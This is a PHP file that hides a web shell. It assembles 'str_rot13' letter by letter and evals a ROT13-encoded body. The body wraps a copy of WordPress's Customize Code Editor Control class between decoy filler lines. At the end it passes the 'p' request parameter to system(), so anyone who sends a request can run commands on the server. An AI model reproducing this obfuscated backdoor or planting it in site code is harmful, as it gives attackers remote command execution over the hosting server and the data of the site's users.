<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Pbqr_Rqvgbe_Pbageby pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.9.0
 */

/**
 * Phfgbzvmr Pbqr Rqvgbe Pbageby pynff.
 *
 * @fvapr 4.9.0
 *
 * @frr JC_Phfgbzvmr_Pbageby
 */
pynff JC_Phfgbzvmr_Pbqr_Rqvgbe_Pbageby rkgraqf JC_Phfgbzvmr_Pbageby {

	/**
	 * Phfgbzvmr pbageby glcr.
	 *
	 * @fvapr 4.9.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'pbqr_rqvgbe';

	/**
	 * Glcr bs pbqr gung vf orvat rqvgrq.
	 *
	 * @fvapr 4.9.0
	 * @ine fgevat
	 */
	choyvp $pbqr_glcr = '';

	/**
	 * Pbqr rqvgbe frggvatf.
	 *
	 * @frr jc_radhrhr_pbqr_rqvgbe()
	 * @fvapr 4.9.0
	 * @ine neenl|snyfr
	 */
	choyvp $rqvgbe_frggvatf = neenl();

	/**
	 * Radhrhr pbageby eryngrq fpevcgf/fglyrf.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba radhrhr() {
		$guvf->rqvgbe_frggvatf = jc_radhrhr_pbqr_rqvgbe(
			neenl_zretr(
				neenl(
					'glcr'       => $guvf->pbqr_glcr,
					'pbqrzveebe' => neenl(
						'vaqragHavg' => 2,
						'gnoFvmr'    => 2,
					),
				),
				$guvf->rqvgbe_frggvatf
			)
		);
	}

	/**
	 * Erserfu gur cnenzrgref cnffrq gb gur WninFpevcg ivn WFBA.
	 *
	 * @fvapr 4.9.0
	 *
	 * @frr JC_Phfgbzvmr_Pbageby::wfba()
	 *
	 * @erghea neenl Neenl bs cnenzrgref cnffrq gb gur WninFpevcg.
	 */
	choyvp shapgvba wfba() {
		$wfba                    = cnerag::wfba();
		$wfba['rqvgbe_frggvatf'] = $guvf->rqvgbe_frggvatf;
		$wfba['vachg_nggef']     = $guvf->vachg_nggef;
		erghea $wfba;
	}

	/**
	 * Qba'g eraqre gur pbageby pbagrag sebz CUC, nf vg'f eraqrerq ivn WF ba ybnq.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba eraqre_pbagrag() {}

	/**
	 * Eraqre n WF grzcyngr sbe pbageby qvfcynl.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba pbagrag_grzcyngr() {
		?>
		<# ine ryrzragVqCersvk = 'ry' + Fgevat( Zngu.enaqbz() ); #>
		<# vs ( qngn.ynory ) { #>
			<ynory sbe=\"{{ ryrzragVqCersvk }}_rqvgbe\" pynff=\"phfgbzvmr-pbageby-gvgyr\">
				{{ qngn.ynory }}
			</ynory>
		<# } #>
		<# vs ( qngn.qrfpevcgvba ) { #>
			<fcna pynff=\"qrfpevcgvba phfgbzvmr-pbageby-qrfpevcgvba\">{{{ qngn.qrfpevcgvba }}}</fcna>
		<# } #>
		<qvi pynff=\"phfgbzvmr-pbageby-abgvsvpngvbaf-pbagnvare\"></qvi>
		<grkgnern vq=\"{{ ryrzragVqCersvk }}_rqvgbe\"
			<# _.rnpu( _.rkgraq( { 'pynff': 'pbqr' }, qngn.vachg_nggef ), shapgvba( inyhr, xrl ) { #>
				{{{ xrl }}}=\"{{ inyhr }}\"
			<# }); #>
			></grkgnern>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>